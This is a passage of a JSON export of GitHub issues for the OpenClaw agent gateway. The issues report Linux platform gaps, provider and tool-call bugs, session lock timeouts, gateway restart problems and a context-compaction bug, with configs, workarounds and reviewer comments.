      "body": "## Problem\n\nWhen launching the OpenClaw-managed Chrome browser on Linux, the code checks `WAYLAND_DISPLAY` to determine if a display is available, but never passes `--ozone-platform=wayland` to Chrome.\n\nOn Wayland-only desktops (GNOME 46+, many Fedora/Ubuntu installs that have dropped X11), Chrome falls back to XWayland which can cause rendering issues, input lag, or failure if XWayland is not installed.\n\n## Impact\n\nUsers on modern Wayland-only Linux desktops may experience degraded browser automation or Chrome failing to start properly.\n\n## Suggested Fix\n\nIn the Chrome launch args in `launchOpenClawChrome()`:\n\n```javascript\nif (process.platform === \"linux\") {\n  args.push(\"--disable-dev-shm-usage\"); // already present\n  if (process.env.WAYLAND_DISPLAY && !process.env.DISPLAY) {\n    args.push(\"--ozone-platform=wayland\");\n  }\n}\n```\n\nOnly add the flag when WAYLAND_DISPLAY is set but DISPLAY is not (pure Wayland). When both are set, XWayland is available and Chrome can choose.\n\n## Where in Code\n\n- `dist/chrome-*.js` — `launchOpenClawChrome()` function, around line 1870\n\n## Environment\n\n- OpenClaw v2026.2.9\n- Linux with Wayland compositor (GNOME, Sway, Hyprland, etc.)",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14080",
      "createdAt": "2026-02-11T12:56:55Z",
      "updatedAt": "2026-02-11T12:56:55Z",
      "author": "holistic-medical-supply-base",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": []
      }
    },
    {
      "number": 14079,
      "title": "Linux: No desktop notifications support",
      "body": "## Problem\n\nmacOS gets native desktop notifications via `osascript`. Linux has no notification support at all — no `notify-send`, no libnotify, no D-Bus notification integration.\n\n## Impact\n\nLinux desktop users never receive system notifications from OpenClaw. On macOS, users get notified of important events; on Linux, they have to check manually or rely on channel messages.\n\n## Suggested Fix\n\n- Use `notify-send` (from `libnotify-bin`) as the primary Linux notification method\n- Fall back to D-Bus notification directly if `notify-send` is missing\n- Gracefully degrade on headless servers (no DISPLAY/WAYLAND_DISPLAY → skip)\n- Could also support `dunstify` for dunst users or check for common notification daemons\n\n## Detection Logic\n\n```javascript\nif (process.env.DISPLAY || process.env.WAYLAND_DISPLAY) {\n  // try notify-send, then dbus, then skip\n}\n```\n\n## Environment\n\n- OpenClaw v2026.2.9\n- Linux with desktop environment",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14079",
      "createdAt": "2026-02-11T12:56:44Z",
      "updatedAt": "2026-02-11T12:56:44Z",
      "author": "holistic-medical-supply-base",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos",
          "linux"
        ],
        "components": [
          "gateway"
        ]
      }
    },
    {
      "number": 14078,
      "title": "Linux: No fallback for non-systemd init systems",
      "body": "## Problem\n\nOn Linux, OpenClaw exclusively uses systemd user services for daemon management. If systemd is unavailable (Alpine Linux, Void Linux, Artix, Docker containers, older init systems), the only guidance is:\n\n> \"install/enable systemd or run the gateway under your supervisor\"\n\nmacOS has launchd which is universal — every Mac has it. Linux has no such guarantee.\n\n## Impact\n\nUsers on non-systemd distros or in containers cannot use `openclaw gateway install` at all. Docker-based deployments (a common server pattern) hit this immediately.\n\n## Suggested Fix\n\n- Add OpenRC service file generation as a fallback\n- Add a simple `nohup` / process manager fallback for unknown inits\n- Detect runit, s6, dinit, or at minimum provide a generic foreground mode that works with any supervisor (supervisord, pm2, etc.)\n- The container case could generate a simple start script or suggest `openclaw gateway --port 18789` as foreground\n\n## Where in Code\n\n- `dist/systemd-hints-*.js` — `renderSystemdUnavailableHints()` provides the vague fallback message\n- `dist/service-DDPRbf8a.js` — `resolveGatewayService()` only returns systemd or launchd\n- `dist/daemon-cli-*.js` — install/uninstall/start/stop all route through `resolveGatewayService()`\n\n## Environment\n\n- OpenClaw v2026.2.9\n- Linux (any non-systemd distro or container)",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14078",
      "createdAt": "2026-02-11T12:56:34Z",
      "updatedAt": "2026-02-11T12:56:34Z",
      "author": "holistic-medical-supply-base",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos",
          "linux",
          "docker"
        ],
        "components": [
          "gateway"
        ]
      }
    },
    {
      "number": 14077,
      "title": "[Bug]: OpenClaw exec tool returns empty output with Always Allow setting",
      "body": "# BUG: OpenClaw exec tool returns empty output with Always Allow setting\n\n## Environment\n- OpenClaw Version: 2026.2.9 (9194)\n- OS: macOS Darwin 25.2.0 (arm64)\n- Node: v24.7.0\n- Exec Approval: Always Allow (configured via GUI)\n- Session: agent:main:main (ebd3104a-e590-40dd-8859-c086eb69b68d)\n\n## Expected Behavior\nWith Exec Approval set to \"Always Allow\", the exec tool should execute shell commands and return output.\n\n## Actual Behavior\nThe exec tool produces no output and no errors. It appears to execute but returns immediately with empty output.\n\n## Evidence\n\n### Test 1: Simple exec call\n```bash\n# Input\nexec --command \"echo test\"\n\n# Result\n(empty output, no errors)\nTest 2: Raw format with timeout\n# Input\nexec --raw '{\"command\":\"echo test\", \"timeout\": 5}'\n\n# Result  \n(empty output, no errors)\nTest 3: CLI check\nopenclaw exec echo hello\n# Output: error: unknown command 'exec'\nTest 4: Config verification\nConfig file location unclear - standard paths don't exist.\n\nRegression Note\nThis worked correctly in Antigravity (predecessor) with Always Allow setting.\n\nPossible Causes\nExec Approval \"Always Allow\" not properly propagated to exec tool\nBroken RPC communication for exec between agent and gateway\nDifferent implementation between Antigravity and OpenClaw\nGateway not processing exec requests correctly\nRequired Fix\nVerify Exec Approval \"Always Allow\" is correctly applied to exec tool\nTest exec with multiple formats (simple, raw, with timeout)\nRestore parity with Antigravity functionality\nCurrent Workaround\nManual command execution by user (unsustainable for agent automation)\n\nPriority\nHIGH - Blocks full agent automation\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14077",
      "createdAt": "2026-02-11T12:52:54Z",
      "updatedAt": "2026-02-11T12:52:54Z",
      "author": "luigigalli",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "config"
        ]
      }
    },
    {
      "number": 14075,
      "title": "[Bug]: Tool calls display as raw JSON instead of executing when using Synthetic provider (Anthropic API)",
      "body": "## Summary\n\nWhen using the Synthetic provider with its default Anthropic-compatible API, tool calls are displayed as raw JSON text in Discord instead of being executed. This does not occur when using Synthetic's OpenAI-compatible API or other providers.\n\n## Steps to reproduce\n\n1. Configure OpenClaw with Synthetic provider using Anthropic API:\n```\n{\n  \"models\": {\n    \"providers\": {\n      \"synthetic\": {\n        \"baseUrl\": \"https://api.synthetic.new/anthropic\",\n        \"api\": \"anthropic-messages\"\n      }\n    }\n  }\n}\n```\n2. Set model to synthetic/hf:moonshotai/Kimi-K2.5\n3. Ask the agent to use any tool (e.g., exec, web_search, read)\n4. Observe Discord output\n\n## Expected behavior\n\nTool calls execute and results are displayed as formatted responses. User should see:\n> \"Current time: 2026-02-11 21:11:04\"\n\n## Actual behavior\n\nRaw tool call JSON is displayed in Discord:\n```\nThe user wants me to check for any fixes or workarounds posted since the issue was opened. Let me search for updates on this bug.\nI found a potentially relevant result - the releases page mentions #1467. Let me check the releases and the troubleshooting guide:\nI'm on the latest version (2026.2.9). Let me check if there are any recent updates or comments on the issue itself:\n<|tool_call_begin|> functions.web_fetch:100 <|tool_call_argument_begin|> {\"url\": \"https://github.com/openclaw/openclaw/blob/main/CHANGELOG.md\", \"maxChars\": 3000} <|tool_call_end|> <|tool_calls_section_end|>\n```\n\n## Environment\n\n- OpenClaw Version: 2026.2.9\n- Provider: synthetic (Anthropic API - https://api.synthetic.new/anthropic)\n- Model: synthetic/hf:moonshotai/Kimi-K2.5\n- Channel: Discord\n- Working Providers: openrouter/moonshotai/kimi-k2.5, anthropic/claude-opus-4-5\n- OS: Ubuntu 24.02 LTS\n- Install method (pnpm/npx/docker/etc): pnpm\n\n## Workaround\n\nUse Synthetic's OpenAI-compatible API instead:\n```\n{\n  \"models\": {\n    \"providers\": {\n      \"synthetic-openai\": {\n        \"baseUrl\": \"https://api.synthetic.new/v1\",\n        \"api\": \"openai-completions\",\n        \"models\": [{\n          \"id\": \"hf:moonshotai/Kimi-K2.5\",\n          \"name\": \"Kimi K2.5 (Synthetic OpenAI)\"\n        }]\n      }\n    }\n  }\n}\n```\n\n## Additional Context\n- Auth is correctly configured (API key present in auth-profiles.json)\n- Gateway restart does not resolve the issue\n- `/new` and `/reset` do not resolve the issue\n- The issue appears specific to how OpenClaw processes Anthropic-style tool calls from Synthetic vs other providers\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14075",
      "createdAt": "2026-02-11T12:47:00Z",
      "updatedAt": "2026-02-11T12:48:45Z",
      "author": "the1bruh",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "discord"
        ],
        "platforms": [
          "linux",
          "docker"
        ],
        "components": [
          "gateway",
          "config"
        ]
      }
    },
    {
      "number": 9364,
      "title": "Session file lock timeout is hardcoded; needs env var / config override for k8s environments",
      "body": "## Problem\n\nWhen running OpenClaw in Kubernetes pods, we frequently hit session file lock timeouts:\n\n```\nAgent failed before reply: session file locked (timeout 10000ms): pid=16\n/root/.openclaw/agents/main/sessions/<id>.jsonl.lock\n```\n\n**Root cause**: During long LLM responses (compaction, memory flush, etc.), the session write lock is held for extended periods. When a new Slack message arrives and tries to write to the same session file, it times out after 10 seconds.\n\n## Current Implementation\n\nIn `src/agents/session-write-lock.ts`:\n\n```typescript\nconst timeoutMs = params.timeoutMs ?? 10_000;  // hardcoded 10s\nconst staleMs = params.staleMs ?? 30 * 60 * 1000;  // hardcoded 30min\n```\n\n- **Lock timeout (10s)**: Too short for k8s environments where LLM calls can take 30-60s+\n- **Stale lock (30min)**: Too long for k8s environments where pods are frequently rescheduled\n- **No env var or config option** to override these values\n- `SIGKILL` (common in k8s pod eviction) bypasses cleanup handlers, leaving stale locks for 30 minutes\n\n## Proposal\n\n### 1. Add environment variable overrides\n\n```typescript\nconst timeoutMs = params.timeoutMs\n  ?? parseInt(process.env.OPENCLAW_SESSION_LOCK_TIMEOUT_MS || \"\", 10)\n  || 10_000;\n\nconst staleMs = params.staleMs\n  ?? parseInt(process.env.OPENCLAW_SESSION_LOCK_STALE_MS || \"\", 10)\n  || 30 * 60 * 1000;\n```\n\n### 2. Reduce default stale lock time for session write lock\n\n30 minutes is too long. In containerized environments, pods restart frequently. A stale lock holding for 30 minutes means the agent is unusable for that duration.\n\nSuggestion: Reduce to **5 minutes** (matching typical k8s pod restart cycles), or at minimum make it configurable.\n\n### 3. Consider retry strategy improvement\n\nInstead of a hard timeout, consider exponential backoff with a configurable max wait, so the lock acquisition can survive longer LLM calls without blocking indefinitely.\n\n## Environment\n\n- Running OpenClaw in EKS (arm64 Spot instances via Karpenter)\n- Slack channel integration\n- Pods are frequently rescheduled due to spot interruptions and node rotation\n- Session files stored on PersistentVolume\n\n## Workaround\n\nCurrently using initContainers and preStop hooks to clean up stale lock files:\n\n```yaml\ninitContainers:\n  - name: cleanup-locks\n    command: [\"sh\", \"-c\", \"find /root/.openclaw -name '*.lock' -delete\"]\nlifecycle:\n  preStop:\n    exec:\n      command: [\"sh\", \"-c\", \"find /root/.openclaw -name '*.lock' -delete\"]\n```\n\nThis is fragile and doesn't solve the in-process lock contention during long LLM calls.\n",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/9364",
      "createdAt": "2026-02-05T04:49:27Z",
      "updatedAt": "2026-02-11T12:40:27Z",
      "author": "HirokiKobayashi-R",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "slack"
        ],
        "platforms": [
          "docker"
        ],
        "components": [
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3884180148,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9364#issuecomment-3884180148",
          "createdAt": "2026-02-11T12:40:27Z",
          "updatedAt": "2026-02-11T12:40:27Z",
          "author": "I0bster",
          "body": "> **Note: Input validation required for configurable lock timeouts**\n\nThis change will likely introduce **user-controlled input** that flows into:\n- `timeoutMs` and `staleMs` in `src/agents/session-write-lock.ts:120-121`\n- `src/config/sessions/store.ts:593-595`\n\nHowever the override is exposed (env var, config file, etc.), the parsed value must be **bounded with min/max clamps**, not only validated as a number.\n\n### Why this matters\n- An **unbounded `timeoutMs`** (e.g., `999999999999`) can cause the lock acquisition loop at `src/agents/session-write-lock.ts:156` to **hang indefinitely**. This is a silent DoS that consumes a k8s pod slot without errors or crashes.\n- An **unbounded `staleMs`** has the same hang risk (stale locks from crashed pods never reclaimed, all other pods spin until timeout).\n- A **zero or negative `staleMs`** causes every lock to be treated as immediately stale, **bypassing mutual exclusion** and allowing concurrent writes to session files.\n\n### Reference implementation to follow\n- `src/agents/bash-process-registry.ts` (lines `4–16`): defines explicit `MIN_* / MAX_* / DEFAULT_*` constants and clamps with:\n  - `Math.min(Math.max(value, min), max)`\n- Also see reusable helpers in `src/agents/bash-tools.shared.ts:152-171`:\n  - `clampWithDefault()`\n  - `readEnvInt()`\n\n### Pattern to avoid\nDo **not** follow `shell-env.ts:resolveShellEnvFallbackTimeoutMs`:\n- It uses `isFinite` + `Math.max(0)` but has **no upper bound**.\n\n### Suggested bounds\n- **Lock acquisition timeout:** min `1_000` ms, max `300_000` ms (5 min)\n- **Stale lock threshold:** min `10_000` ms, max `7_200_000` ms (2 hr)"
        }
      ]
    },
    {
      "number": 14071,
      "title": "[Bug]: Poe Gemini models return answer in reasoning_content instead of content",
      "body": "## Bug Description\n\nWhen using Poe's `gemini-3-flash` model via the **OpenAI Chat Completions API** (`/v1/chat/completions`), the response sometimes returns the actual answer in `choices[0].message.reasoning_content` instead of `choices[0].message.content`, causing OpenClaw to display \"no response\" even though the model did generate an answer.\n\n## Steps to Reproduce\n\n**Provider config:**\n```json\n{\n  \"models\": {\n    \"providers\": {\n      \"poe\": {\n        \"baseUrl\": \"https://api.poe.com/v1\",\n        \"apiKey\": \"${POE_API_KEY}\",\n        \"api\": \"openai-completions\",\n        \"models\": [\n          { \"id\": \"gemini-3-flash\", \"name\": \"Gemini 3 Flash (Poe)\" }\n        ]\n      }\n    }\n  }\n}\n```\n\n**Test request:**\n```bash\ncurl \"https://api.poe.com/v1/chat/completions\" \\\n  -H \"Content-Type: application/json\" \\\n  -H \"Authorization: Bearer $POE_API_KEY\" \\\n  -d '{\"model\":\"gemini-3-flash\",\"messages\":[{\"role\":\"user\",\"content\":\"Reply with exactly: OK\"}]}'\n```\n\n**Observed behavior:**\n- ~30-50% of responses have `content: \"\"` (empty) and the actual answer in `reasoning_content`\n- OpenClaw only reads `message.content`, so these responses appear as \"no response\"\n\n**Example response:**\n```json\n{\n  \"choices\": [{\n    \"message\": {\n      \"role\": \"assistant\",\n      \"content\": \"\",\n      \"reasoning_content\": \"**Processing the prompt**\\n\\nThe user wants...\\n\\nOK\"\n    }\n  }]\n}\n```\n\n## Expected Behavior\n\nOpenClaw should display the model's response even when it's in `reasoning_content` rather than `content`.\n\n## Workaround\n\nUse Poe's **OpenAI Responses API** (`/v1/responses`) instead, which reliably returns the answer in `output[0].content[0].text`.\n\n**Working config:**\n```json\n{\n  \"models\": {\n    \"providers\": {\n      \"poe_responses\": {\n        \"baseUrl\": \"https://api.poe.com/v1\",\n        \"apiKey\": \"${POE_API_KEY}\",\n        \"api\": \"openai-responses\",\n        \"models\": [\n          { \"id\": \"gemini-3-flash\", \"name\": \"Gemini 3 Flash (Poe)\" }\n        ]\n      }\n    }\n  }\n}\n```\n\n## Proposed Solution\n\nFor providers/models known to use `reasoning_content` (e.g., OpenAI's o1 models, Poe's Gemini), OpenClaw's chat completions adapter should:\n\n1. Check if `message.content` is empty or missing\n2. Fall back to `message.reasoning_content` if present\n3. Optionally log a warning about non-standard response format\n\nThis would make `gemini-3-flash` (and similar models) work reliably via `/v1/chat/completions` without requiring users to switch to the Responses API.\n\n## Environment\n\n- **OpenClaw version:** 2026.2.9\n- **Provider:** Poe (`api.poe.com`)\n- **Model:** `gemini-3-flash`\n- **API:** OpenAI Chat Completions (`/v1/chat/completions`)",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14071",
      "createdAt": "2026-02-11T12:32:38Z",
      "updatedAt": "2026-02-11T12:34:40Z",
      "author": "JimmyShi22",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 7173,
      "title": "[Bug]: New install/update does not repair removed core files like the gateway runner",
      "body": "## Summary\n\nI deleted the gateway runner from a previous 1.29 install, and tried installing 1.30 and 2.1. Gateway file is missing.\n\n## Steps to reproduce\n\n0. Run the openclaw uninstall command, don't reboot\n1. Delete the file that is running the gateway on boot\n2. Try to install a newer version of openclaw via CMD\n3. Complete the clawdbot onboard --install-daemon\n\n## Expected behavior\n\nThe full installation capable of running the gateway, some repair functionality that restores missing core files.\n\n## Actual behavior\n\nThe install says [*] existing openclaw installation detected, even when the uninstall command has run, and the folder .openclaw is empty. The installation isn't able to repair a damaged or missing gateway runner via doctor.\n\n## Environment\n\n- Clawdbot version: 1.30 to 2.1\n- OS: Winows 10\n- Install method (cmd from main page):\n\n## Logs or screenshots\n\nGateway page error: \nUnable to connect\nBrowser can’t establish a connection to the server at 127.0.0.1:18789.\n\n<img width=\"505\" height=\"183\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/87720562-95f1-473c-8fe8-e0984a55a2e9\" />\n\n[openclaw-2026-02-02.log](https://github.com/user-attachments/files/25014711/openclaw-2026-02-02.log)\n",
      "state": "closed",
      "comments": 3,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/7173",
      "createdAt": "2026-02-02T14:02:54Z",
      "updatedAt": "2026-02-11T12:31:03Z",
      "author": "absol89",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "gateway",
          "onboarding",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3835460948,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7173#issuecomment-3835460948",
          "createdAt": "2026-02-02T14:27:29Z",
          "updatedAt": "2026-02-02T14:27:29Z",
          "author": "absol89",
          "body": "Had to ask another AI what to do and it recommended the command:\nopenclaw gateway --port 18789 --verbose and this seems to start it. There's still no file running this at startup like before in 1.29"
        },
        {
          "id": 3875451246,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7173#issuecomment-3875451246",
          "createdAt": "2026-02-10T05:39:25Z",
          "updatedAt": "2026-02-10T05:39:25Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        },
        {
          "id": 3884130250,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7173#issuecomment-3884130250",
          "createdAt": "2026-02-11T12:31:03Z",
          "updatedAt": "2026-02-11T12:31:03Z",
          "author": "absol89",
          "body": "I seem to have a new openclaw-gateway.bat after updating to latest. Closing"
        }
      ]
    },
    {
      "number": 11237,
      "title": "[Bug]: Gateway Uninstalled on Restart (v2026.2.6-3)",
      "body": "Bug Report: Gateway Uninstalled on Restart (v2026.2.6-3)\n🐛 Bug Description\nIn OpenClaw version 2026.2.6-3, if gateway.commands.restart = true is not set in the configuration file, restarting OpenClaw causes the gateway to be uninstalled.\n\n📋 Steps to Reproduce\nUpgrade OpenClaw to version 2026.2.6-3\nEnsure gateway.commands.restart is not configured\nRestart OpenClaw: openclaw gateway restart\nGateway gets uninstalled\n✅ Expected Behavior\nRestarting OpenClaw should not uninstall the gateway, regardless of whether gateway.commands.restart is configured.\n\n❌ Actual Behavior\nThe gateway is uninstalled after restart.\n\n🌍 Environment\nOpenClaw Version: 2026.2.6-3\nOperating System: macOS (Mac Mini M4)\nNode.js Version: v24.13.0\nnpm Version: 11.6.2\nInstallation Method: npm global install\n⚙️ Configuration Files\nProblematic Configuration (causes gateway uninstall)\n{\n  \"gateway\": {\n    \"port\": 18789,\n    \"mode\": \"local\",\n    \"bind\": \"lan\",\n    \"controlUi\": {\n      \"allowInsecureAuth\": true\n    },\n    \"auth\": {\n      \"mode\": \"token\",\n      \"token\": \"...\"\n    }\n  }\n}\nWorking Configuration (with fix)\n{\n  \"gateway\": {\n    \"port\": 18789,\n    \"mode\": \"local\",\n    \"bind\": \"lan\",\n    \"commands\": {\n      \"restart\": true\n    },\n    \"controlUi\": {\n      \"allowInsecureAuth\": true\n    },\n    \"auth\": {\n      \"mode\": \"token\",\n      \"token\": \"...\"\n    }\n  }\n}\n💡 Workaround\nAdd the following to the gateway section in ~/.openclaw/openclaw.json:\n\n\"commands\": {\n  \"restart\": true\n}\nThen restart the gateway:\n\nopenclaw gateway restart\n📊 Impact\nSeverity: High\nAffected Users: All users upgrading from earlier versions\nUser Impact: If users are unaware of this configuration requirement, restarting will cause gateway functionality to be lost\n🔍 Additional Context\nThis issue does not exist in version 2026.2.3-1\nThe configuration requirement is not documented in the upgrade notes\nNo warning or error message is shown before the gateway is uninstalled\n💭 Suggestions\nIf gateway.commands.restart is a required configuration, it should be documented in the upgrade guide\nSet a default value to prevent gateway uninstallation\nShow a warning before removing the gateway\nInclude this requirement in the migration/upgrade process\n📝 Related\nVersion affected: 2026.2.6-3\nWorking version: 2026.2.3-1\nConfiguration schema may need documentation update\nReporter: User running OpenClaw on macOS (Mac Mini M4) Date: 2026-02-07",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/11237",
      "createdAt": "2026-02-07T15:56:38Z",
      "updatedAt": "2026-02-11T12:30:57Z",
      "author": "afanamigo",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3864752703,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11237#issuecomment-3864752703",
          "createdAt": "2026-02-07T16:04:53Z",
          "updatedAt": "2026-02-07T16:04:53Z",
          "author": "afanamigo",
          "body": "sorry this report is written by openclaw. not hand make"
        },
        {
          "id": 3884129555,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11237#issuecomment-3884129555",
          "createdAt": "2026-02-11T12:30:57Z",
          "updatedAt": "2026-02-11T12:30:57Z",
          "author": "dmgithome",
          "body": "+1 Experiencing the same issue on v2026.2.9 (macOS, Apple Silicon, LaunchAgent).\n\n**Observed behavior:** When the gateway's embedded agent (QQ channel) triggers a self-restart via `triggerOpenClawRestart()`, the process receives SIGTERM and exits cleanly (code 0), but the LaunchAgent is not re-registered with launchd — the service simply disappears. `launchctl list` no longer shows `ai.openclaw.gateway`, and the gateway stays dead until manually running `launchctl load`.\n\n**Root cause from code analysis:** `triggerOpenClawRestart()` in `loader-Ds3or8QX.js` uses `launchctl kickstart -k gui/$UID/$LABEL`. This works fine when the service is still registered. However, if the service was previously `bootout`-ed (e.g., during an update or config-triggered restart that calls `installLaunchAgent` which does `bootout` → `bootstrap`), and the `bootstrap` step fails for any reason, the service registration is permanently lost. The `kickstart -k` then has nothing to kick.\n\nThe SIGUSR1 soft-restart path (in-process restart via `restartResolver`) works correctly and doesn't hit this issue. The problem is specifically with SIGTERM-based restarts where the process exits and relies on launchd to bring it back.\n\n**Workaround:** I set up a lightweight watchdog LaunchAgent that runs every 30 seconds, checks if `ai.openclaw.gateway` is loaded, and does `launchctl load` if it's missing. This reliably catches the gap.\n\n**Suggested fix:** Consider using `launchctl kickstart -k` (without prior `bootout`) for restart scenarios, or fall back to `launchctl load` if `kickstart` fails. The `bootout` call should only be used for explicit `gateway uninstall` / `gateway stop`, not as part of the restart flow.\n\nRelated: #3780, #13002"
        }
      ]
    },
    {
      "number": 5790,
      "title": "Ollama/local models ignored — hard fallback to Anthropic provider in Gateway and CLI (v2026.1.30)",
      "body": "**Version**: 2026.1.30 (76b5208)\n\n**Issue**:\nSetting local/Ollama model via `openclaw models set qwen2.5-coder:7b` results in logs always showing `agent model: anthropic/qwen2.5-coder:7b` (or full Anthropic fallback).\n\nMessages in Control UI fail silently (no response/file creation) because no Anthropic API key is configured.\n\nEnv vars (LLM_PROVIDER=ollama, OLLAMA_BASE_URL, OLLAMA_MODEL) do not override.\n\n`models add` rejects --provider / --baseUrl flags.\n\nConfig keys like \"llm\", \"models.default\", \"agents.main\", \"gateway.bind\" trigger validation errors and are removed by doctor --fix.\n\n**Reproduction**:\n1. ollama pull qwen2.5-coder:7b\n2. ollama run qwen2.5-coder:7b\n3. openclaw models set qwen2.5-coder:7b\n4. openclaw gateway --force --allow-unconfigured --token test\n5. Logs show anthropic fallback.\n6. UI chat messages get no response.\n\n**Workaround**:\nDirect Ollama curl or wrapper script works fine.\n\n**Expected**:\nGateway/agent uses Ollama when set via CLI/config/env.\n\n**Environment**:\nmacOS (M4 Pro, 24 GB RAM)\nOllama 0.15.2 (Metal)\nNode.js v22.22.0\nnpm-installed OpenClaw",
      "state": "open",
      "comments": 3,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/5790",
      "createdAt": "2026-02-01T00:02:23Z",
      "updatedAt": "2026-02-11T12:30:57Z",
      "author": "margrimm9999",
      "labels": [
        "bug",
        "stale"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "web-ui",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3845012832,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5790#issuecomment-3845012832",
          "createdAt": "2026-02-04T03:18:03Z",
          "updatedAt": "2026-02-04T03:18:03Z",
          "author": "AdamRGrey",
          "body": "possibly worth noting: https://github.com/openclaw/openclaw/issues/2021#issuecomment-3830033363 - ollama offers a config, which works with an old name?"
        },
        {
          "id": 3882018154,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5790#issuecomment-3882018154",
          "createdAt": "2026-02-11T04:11:31Z",
          "updatedAt": "2026-02-11T04:11:31Z",
          "author": "openclaw-barnacle[bot]",
          "body": "This issue has been automatically marked as stale due to inactivity.\nPlease add updates or it will be closed."
        },
        {
          "id": 3884129646,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/5790#issuecomment-3884129646",
          "createdAt": "2026-02-11T12:30:57Z",
          "updatedAt": "2026-02-11T12:30:57Z",
          "author": "qkzhu",
          "body": "It works to me after upgrading `openclaw` to `2026.2.6-3`.\n\nHere is part of my config in case need to reference\n```JSON\n{\n  \"other configs\":\"...\",\n  \"models\": {\n    \"mode\": \"merge\",\n    \"providers\": {\n      \"ollama\": {\n        \"baseUrl\": \"http://localhost:11434/v1\",\n        \"apiKey\": \"ollama-local\",\n        \"api\": \"openai-completions\",\n        \"models\": [\n          {\n            \"id\": \"ollama/qwen2.5:7b\",\n            \"name\": \"qwen 2:5:7b\",\n            \"reasoning\": false,\n            \"input\": [\n              \"text\"\n            ],\n            \"cost\": {\n              \"input\": 0,\n              \"output\": 0,\n              \"cacheRead\": 0,\n              \"cacheWrite\": 0\n            },\n            \"contextWindow\": 32768,\n            \"maxTokens\": 2048\n          }\n        ]\n      }\n    }\n  },\n  \"agents\": {\n    \"defaults\": {\n      \"model\": {\n        \"primary\": \"ollama/qwen2.5:7b\"\n      },\n      \"compaction\": {\n        \"mode\": \"safeguard\"\n      },\n      \"maxConcurrent\": 4,\n      \"subagents\": {\n        \"maxConcurrent\": 8\n      }\n    }\n  },\n  \"other configs\":\"...\"\n}\n```"
        }
      ]
    },
    {
      "number": 14070,
      "title": "[Bug]: In ./docker-setup.sh onboard stage, when user say \"no\" to first question, setup should exit immediately.",
      "body": "And now it start the gateway docker instead.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14070",
      "createdAt": "2026-02-11T12:29:19Z",
      "updatedAt": "2026-02-11T12:29:19Z",
      "author": "luzi82",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "docker"
        ],
        "components": [
          "gateway",
          "onboarding"
        ]
      }
    },
    {
      "number": 14065,
      "title": "Bug: cache-ttl custom event after compaction orphans keepRecentTokens entries",
      "body": "## Bug Description\n\nAfter auto-compaction, an `openclaw.cache-ttl` custom event can orphan the \"kept\" entries (from `keepRecentTokens`), causing a second compaction that permanently destroys all recently kept messages.\n\n## Steps to Reproduce\n\n1. Run on an Anthropic model (e.g. Claude Opus)\n2. Let auto-compaction trigger (threshold maintenance)\n3. Compaction correctly marks recent entries as \"kept\" via `firstKeptEntryId`\n4. Before the next user/assistant turn, an `openclaw.cache-ttl` event is injected\n5. This event has `parentId` = the compaction entry id (not the last kept entry id)\n6. Next context rebuild follows tree: cache-ttl → compaction (summary only) — kept entries are on a different branch, orphaned\n7. A second compaction triggers with only ~3,800 tokens (= summary size only)\n8. All originally kept entries are permanently lost\n\n## Evidence (real session data)\n\n| Event | Line | tokensBefore | firstKeptEntryId |\n|---|---|---|---|\n| Compaction #3 | L709 | 187,439 | L639 (70 entries, ~45K tokens kept) |\n| cache-ttl event | L710 | — | parentId = L709 (compaction) |\n| Compaction #4 | L711 | **3,799** | L710 (cache-ttl event) |\n\n**Smoking gun:** Compaction #3 summary = 15,194 chars ≈ 3,798 tokens. Compaction #4 `tokensBefore` = 3,799. Exact match — proving the context after compaction #3 contained ONLY the summary, not the ~45K tokens of kept entries.\n\n**Why this did not happen at earlier compactions in the same session:** After compactions #1 and #2, the first entry was a normal assistant message (properly continuing the tree from kept entries). After compaction #3, the first entry was an automated `cache-ttl` event with `parentId` pointing to the compaction entry — breaking the tree.\n\n## Expected 